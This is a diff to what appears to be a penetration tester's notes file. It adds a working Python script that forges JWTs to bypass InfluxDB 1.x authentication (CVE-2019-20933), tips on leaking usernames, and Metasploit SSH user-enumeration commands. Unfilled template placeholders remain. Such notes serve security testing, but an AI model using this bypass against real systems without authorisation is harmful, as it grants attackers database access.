@@ -24,8 +24,6 @@ Attacking common network services involves exploiting misconfigurations, weak cr
 
 ---
 
-## FTP (Port 21 / 2121)
-
 ### Anonymous Login
 
 FTP servers may allow `anonymous` as the username with no password. Anonymous access can expose sensitive files and, if write permissions are misconfigured, allow uploading malicious scripts that a web server may execute.
@@ -2928,3 +2926,44 @@ Then reuse any recovered password against `su`/SSH/other services before hunting
 the external nmap never saw them.
 
 <!-- promoted-slug: mongo-localhost-postfoothold-loot -->
+
+## <Heading>
+
+<generic technique steps; no client host/IP/domain>
+
+## InfluxDB 1.x JWT auth-bypass gotchas (CVE-2019-20933 in practice)
+
+- The forged token must ride the `Authorization: Bearer <jwt>` header. Passing it as the `u=<user>&p=<jwt>` query params takes the PASSWORD path and always returns `authorization failed` - the error is identical to a bad signature, so it silently misleads.
+- The bypass needs an EXISTING username; do not brute a wordlist. The unauth `/debug/requests` endpoint leaks live per-user counters as `"<username>:<ip>": {"writes":N,"queries":N}` - read the username there first, then forge for it.
+- Forge is plain stdlib: HS256 header, claims `{"username":..., "exp":<future>}`, signature HMAC-SHA256 over `h.p` with an EMPTY key (`hmac.new(b'', ...)`).
+- Confirm success with `SHOW DATABASES`; `SHOW USERS` then shows whether the user is admin.
+
+```py
+import base64,hmac,hashlib,json,time
+def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
+h=b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
+p=b64(json.dumps({"username":"<user>","exp":int(time.time())+86400},separators=(',',':')).encode())
+sig=b64(hmac.new(b'',(h+'.'+p).encode(),hashlib.sha256).digest())
+print(h+'.'+p+'.'+sig)
+```
+
+<!-- promoted-slug: influxdb-jwt-auth-gotchas -->
+
+## <Heading>
+
+<generic technique steps; no client host/IP/domain>
+
+### ssh_enumusers false-positive abort (CVE-2018-15473)
+
+The module self-checks its timing oracle before enumerating; on an sshd that does not
+discriminate (observed on an old-Debian container sshd) it aborts with "throws false
+positive results. Aborting." Forcing `set CHECK_FALSE_POSITIVES false` past the abort
+yields garbage: EVERY wordlist entry prints as "found". Treat the abort itself as the
+answer (the oracle is dead on that target); never read a forced run's output as enum.
+
+```text
+msf> use auxiliary/scanner/ssh/ssh_enumusers
+msf> set CHECK_FALSE_POSITIVES false   # NOT a fix: all-valid output == no oracle
+```
+
+<!-- promoted-slug: ssh-enumusers-false-positive-abort -->
